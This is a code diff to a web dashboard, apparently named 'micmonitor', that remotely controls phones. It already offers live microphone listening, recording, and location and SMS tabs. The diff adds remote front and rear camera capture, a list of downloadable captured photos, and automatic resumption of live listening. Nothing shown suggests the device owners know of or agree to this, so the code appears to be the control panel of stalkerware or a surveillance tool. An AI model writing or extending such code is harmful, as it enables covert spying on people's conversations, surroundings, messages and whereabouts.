@@ -841,6 +841,47 @@
       .rec-list .rec-item a {
         max-width: none;
       }
+      .photo-list {
+        margin-bottom: 10px;
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+      }
+      .photo-item {
+        display: grid;
+        grid-template-columns: 76px 1fr;
+        gap: 8px;
+        align-items: center;
+        background: var(--bg2);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 6px;
+      }
+      .photo-thumb {
+        width: 72px;
+        height: 54px;
+        object-fit: cover;
+        border-radius: 6px;
+        border: 1px solid var(--border2);
+        display: block;
+      }
+      .photo-meta {
+        font-size: 10px;
+        color: var(--text3);
+        margin-bottom: 2px;
+        letter-spacing: 0.04em;
+        text-transform: uppercase;
+      }
+      .photo-link {
+        color: var(--teal2);
+        font-size: 11px;
+        text-decoration: none;
+        font-family: var(--mono);
+      }
+      .photo-link:hover {
+        color: var(--violet2);
+        text-decoration: underline;
+      }
 
       /* ── Event log ──────────────────────────────────────────────── */
       #logOutput {
@@ -1185,6 +1226,8 @@
       const GAIN_STORAGE_PREFIX = "micmonitor:gain:";
       const STREAM_MODE_STORAGE_PREFIX = "micmonitor:streammode:";
       const VOICE_PROFILE_STORAGE_PREFIX = "micmonitor:voiceprofile:";
+      const AUTO_LISTEN_STORAGE_PREFIX = "micmonitor:autolisten:";
+      const PREFER_RTC_STORAGE_PREFIX = "micmonitor:preferrtc:";
       const LOW_NET_STORAGE_KEY = "micmonitor:low-network-mode";
       let rnnoiseLibPromise = null;
       let rnnoiseWasmPromise = null;
@@ -1467,6 +1510,10 @@
             log(`💾 Device saved: ${msg.filename}`, "info");
             refreshRecordingsList();
             break;
+          case "photo_saved":
+            renderPhotoSaved(msg);
+            log(`📸 Photo saved: ${msg.filename}`, "ok");
+            break;
           case "ack":
             log(`ACK ${msg.deviceId}: ${msg.message}`, "info");
             break;
@@ -1669,6 +1716,10 @@
             <button class="btn-ghost" id="btnRn_${deviceId}" onclick="toggleRnnoise('${deviceId}')">RNNoise: ON</button>
             <button class="btn-rec"   id="btnRec_${deviceId}"  onclick="startRecord('${deviceId}')">⏺ Record</button>
             <button class="btn-stop"  id="btnStop_${deviceId}" onclick="stopRecord('${deviceId}')" disabled>⏹ Stop</button>
+            <button class="btn-ghost" onclick="takePhoto('${deviceId}','rear')">📷 Rear</button>
+            <button class="btn-ghost" onclick="takePhoto('${deviceId}','front')">🤳 Front</button>
+            <button class="btn-ghost" onclick="switchCamera('${deviceId}')">🔄 Camera</button>
+            <button class="btn-ghost" id="btnPhotoAi_${deviceId}" onclick="togglePhotoAi('${deviceId}')">Photo AI: ON</button>
             <button class="btn-ghost" onclick="recoverMic('${deviceId}')">🎤 Recover Mic</button>
             <button class="btn-ghost" onclick="refreshData('${deviceId}')">↻ Data</button>
             <button class="btn-ghost" id="btnGain_${deviceId}" onclick="cyclePlaybackGain('${deviceId}')">Gain: 1.5x</button>
@@ -1678,6 +1729,7 @@
             <button class="btn-ghost" id="btnVizMode_${deviceId}" onclick="cycleVizMode('${deviceId}')">Viz: Wave</button>
           </div>
           <div class="rec-list" id="recList_${deviceId}"></div>
+          <div class="photo-list" id="photoList_${deviceId}"></div>
           <div class="tab-bar">
             <button class="tab-btn active" onclick="openTab('${deviceId}','location',this)">📍 Location</button>
             <button class="tab-btn"        onclick="openTab('${deviceId}','sms',this)">💬 SMS</button>
@@ -1691,6 +1743,8 @@
         const savedGain = loadPlaybackGain(deviceId);
         const savedVoiceProfile = loadVoiceProfile(deviceId);
         const savedStreamMode = loadStreamMode(deviceId);
+        const savedAutoListen = loadAutoListen(deviceId);
+        const savedPreferRtc = loadPreferRtc(deviceId);
         deviceState[deviceId] = {
           deviceId,
           isLive: false,
@@ -1740,6 +1794,8 @@
           playbackGain: savedGain,
           voiceProfile: savedVoiceProfile,
           streamMode: savedStreamMode,
+          autoListen: savedAutoListen,
+          preferWebRtc: savedPreferRtc,
           webRtcRnnoiseNode: null,
           pcmRnnoiseNode: null,
           webRtcRnnoiseInitPromise: null,
@@ -1764,11 +1820,13 @@
             webRtcState: "idle",
             bitrateKbps: null,
             quality: null,
+            photoAi: true,
             internetOnline: true,
             callActive: false,
             batteryPct: null,
             charging: null,
           },
+          photoAiEnabled: !!(health?.photoAi !== false),
         };
         const gainBtn = document.getElementById(`btnGain_${deviceId}`);
         if (gainBtn) gainBtn.textContent = `Gain: ${savedGain.toFixed(1)}x`;
@@ -1781,11 +1839,18 @@
         const streamBtn = document.getElementById(`btnStream_${deviceId}`);
         if (streamBtn)
           streamBtn.textContent = `Stream: ${streamModeLabel(savedStreamMode)}`;
+        const photoAiBtn = document.getElementById(`btnPhotoAi_${deviceId}`);
+        if (photoAiBtn)
+          photoAiBtn.textContent = `Photo AI: ${deviceState[deviceId].photoAiEnabled ? "ON" : "OFF"}`;
         sendCmd(deviceId, "voice_profile", { profile: savedVoiceProfile });
         sendCmd(deviceId, "stream_codec", { mode: savedStreamMode });
+        sendCmd(deviceId, "photo_ai", {
+          enabled: deviceState[deviceId].photoAiEnabled,
+        });
         renderDeviceNetworkChip(deviceId, deviceState[deviceId]);
         applyNetworkModeToDevice(deviceId, deviceState[deviceId]);
         renderDeviceHealth(deviceId, deviceState[deviceId].health);
+        maybeAutoResumeLive(deviceId);
       }
 
       function loadRnnoiseEnabled(deviceId) {
@@ -1862,7 +1927,7 @@
           ).toLowerCase();
           if (raw === "pcm" || raw === "smart" || raw === "auto") return raw;
         } catch (_) {}
-        return "auto";
+        return "pcm";
       }
 
       function saveStreamMode(deviceId, mode) {
@@ -1878,6 +1943,57 @@
         if (mode === "smart") return "Smart";
         if (mode === "pcm") return "PCM";
         return "Auto";
+      }
+
+      function loadAutoListen(deviceId) {
+        try {
+          return (
+            localStorage.getItem(`${AUTO_LISTEN_STORAGE_PREFIX}${deviceId}`) ===
+            "1"
+          );
+        } catch (_) {}
+        return false;
+      }
+
+      function saveAutoListen(deviceId, enabled) {
+        try {
+          localStorage.setItem(
+            `${AUTO_LISTEN_STORAGE_PREFIX}${deviceId}`,
+            enabled ? "1" : "0",
+          );
+        } catch (_) {}
+      }
+
+      function loadPreferRtc(deviceId) {
+        try {
+          const raw = localStorage.getItem(
+            `${PREFER_RTC_STORAGE_PREFIX}${deviceId}`,
+          );
+          if (raw === "0") return false;
+          if (raw === "1") return true;
+        } catch (_) {}
+        return true;
+      }
+
+      function savePreferRtc(deviceId, enabled) {
+        try {
+          localStorage.setItem(
+            `${PREFER_RTC_STORAGE_PREFIX}${deviceId}`,
+            enabled ? "1" : "0",
+          );
+        } catch (_) {}
+      }
+
+      function maybeAutoResumeLive(deviceId) {
+        const state = deviceState[deviceId];
+        if (!state || state.isLive || !state.autoListen) return;
+        if (!controlWs || controlWs.readyState !== WebSocket.OPEN) return;
+        setTimeout(() => {
+          const s = deviceState[deviceId];
+          if (!s || s.isLive || !s.autoListen) return;
+          toggleLive(deviceId);
+          log(`Auto-resumed live listen for ${deviceId}`, "ok");
+        }, 350);
       }
 
       function removeDeviceCard(deviceId) {
@@ -1982,6 +2098,13 @@
         if (h.aiAuto !== false) {
           applyAdaptiveNoiseProfile(deviceId, state, Number(h.noiseDb));
         }
+        if (typeof h.photoAi === "boolean") {
+          state.photoAiEnabled = h.photoAi;
+        }
+        const photoAiBtn = document.getElementById(`btnPhotoAi_${deviceId}`);
+        if (photoAiBtn) {
+          photoAiBtn.textContent = `Photo AI: ${state.photoAiEnabled ? "ON" : "OFF"}`;
+        }
 
         updateDeviceNetworkScore(deviceId, state, h);
         updateAutoLowNetworkFlag();
@@ -2052,6 +2175,8 @@
         const btn = document.getElementById(`btnLive_${deviceId}`);
         if (state.isLive) {
           state.isLive = false;
+          state.autoListen = false;
+          saveAutoListen(deviceId, false);
           if (state.useWebRtc) stopWebRtc(deviceId, true);
           if (state.audioCtx) {
             // Tear down PCM processing graph before closing context
@@ -2083,6 +2208,8 @@
           log(`Stopped live listen for ${deviceId}`, "info");
         } else {
           state.isLive = true;
+          state.autoListen = true;
+          saveAutoListen(deviceId, true);
           state.audioCtx = new (
             window.AudioContext || window.webkitAudioContext
           )({ sampleRate: 16000, latencyHint: "interactive" });
@@ -2094,12 +2221,16 @@
           sendCmd(deviceId, "stream_codec", {
             mode: state.streamMode || "auto",
           });
-          const ok = await startWebRtc(deviceId, state);
+          const wantsRtc = state.preferWebRtc !== false;
+          let ok = false;
+          if (wantsRtc) {
+            ok = await startWebRtc(deviceId, state);
+          }
           if (!ok) {
             sendCmd(deviceId, "start_stream");
             log(
-              `WebRTC unavailable for ${deviceId} — using PCM fallback`,
-              "warn",
+              `Live listen started for ${deviceId} (PCM mode)`,
+              wantsRtc ? "warn" : "ok",
             );
           } else {
             log(`Started live listen for ${deviceId} (WebRTC)`, "ok");
@@ -2112,6 +2243,27 @@
       }
       function stopRecord(deviceId) {
         sendCmd(deviceId, "stop_record");
+      }
+      function takePhoto(deviceId, camera = "current") {
+        sendCmd(deviceId, "take_photo", { camera });
+        log(`Capture photo requested (${camera}) for ${deviceId}`, "info");
+      }
+      function switchCamera(deviceId) {
+        sendCmd(deviceId, "switch_camera");
+        log(`Camera switched for ${deviceId}`, "info");
+      }
+      function togglePhotoAi(deviceId) {
+        const state = deviceState[deviceId];
+        if (!state) return;
+        state.photoAiEnabled = !state.photoAiEnabled;
+        const btn = document.getElementById(`btnPhotoAi_${deviceId}`);
+        if (btn)
+          btn.textContent = `Photo AI: ${state.photoAiEnabled ? "ON" : "OFF"}`;
+        sendCmd(deviceId, "photo_ai", { enabled: state.photoAiEnabled });
+        log(
+          `Photo AI ${state.photoAiEnabled ? "enabled" : "disabled"} for ${deviceId}`,
+          "info",
+        );
       }
       function recoverMic(deviceId) {
         sendCmd(deviceId, "start_stream");
@@ -2167,11 +2319,51 @@
         return pctText;
       }
 
+      function renderPhotoSaved(msg) {
+        if (!msg?.deviceId || !msg?.url || !msg?.filename) return;
+        if (!deviceState[msg.deviceId])
+          addDeviceCard(msg.deviceId, "Unknown", null);
+        const list = document.getElementById(`photoList_${msg.deviceId}`);
+        if (!list) return;
+        const item = document.createElement("div");
+        item.className = "photo-item";
+        const cam = String(msg.camera || "rear").toUpperCase();
+        const ai = msg.aiEnhanced ? "AI" : "RAW";
+        const whenTxt = msg.ts
+          ? new Date(Number(msg.ts)).toLocaleString()
+          : new Date().toLocaleString();
+        item.innerHTML = `
+          <a href="${msg.url}" target="_blank" title="${msg.filename}">
+            <img class="photo-thumb" src="${msg.url}" alt="${cam} camera capture" loading="lazy" />
+          </a>
+          <div>
+            <div class="photo-meta">${cam} • ${ai} • ${whenTxt}</div>
+            <a class="photo-link" href="${msg.url}" download="${msg.filename}">⬇ ${msg.filename}</a>
+          </div>
+        `;
+        list.prepend(item);
+        while (list.children.length > 8) {
+          list.removeChild(list.lastChild);
+        }
+      }
+
       async function toggleWebRtc(deviceId) {
         const state = deviceState[deviceId];
         if (!state) return;
-        if (!state.useWebRtc) await startWebRtc(deviceId, state);
-        else stopWebRtc(deviceId, true);
+        if (!state.useWebRtc) {
+          state.preferWebRtc = true;
+          savePreferRtc(deviceId, true);
+          if (!state.isLive) {
+            await toggleLive(deviceId);
+          } else {
+            await startWebRtc(deviceId, state);
+          }
+        } else {
+          state.preferWebRtc = false;
+          savePreferRtc(deviceId, false);
+          stopWebRtc(deviceId, true);
+          if (state.isLive) sendCmd(deviceId, "start_stream");
+        }
       }
 
       function applyPlaybackGain(state) {
@@ -2323,18 +2515,18 @@
         setRnnoiseEnabled(deviceId, state, true, "reset");
         state.playbackGain = 1.5;
         state.voiceProfile = "room";
-        state.streamMode = "auto";
+        state.streamMode = "pcm";
         savePlaybackGain(deviceId, 1.5);
         saveVoiceProfile(deviceId, "room");
-        saveStreamMode(deviceId, "auto");
+        saveStreamMode(deviceId, "pcm");
         const gainBtn = document.getElementById(`btnGain_${deviceId}`);
         if (gainBtn) gainBtn.textContent = "Gain: 1.5x";
         const voiceBtn = document.getElementById(`btnVoice_${deviceId}`);
         if (voiceBtn) voiceBtn.textContent = "Voice: Room";
         const streamBtn = document.getElementById(`btnStream_${deviceId}`);
-        if (streamBtn) streamBtn.textContent = "Stream: Auto";
+        if (streamBtn) streamBtn.textContent = "Stream: PCM";
         sendCmd(deviceId, "voice_profile", { profile: "room" });
-        sendCmd(deviceId, "stream_codec", { mode: "auto" });
+        sendCmd(deviceId, "stream_codec", { mode: "pcm" });
         applyPlaybackGain(state);
         log(`Audio settings reset for ${deviceId}`, "ok");
       }
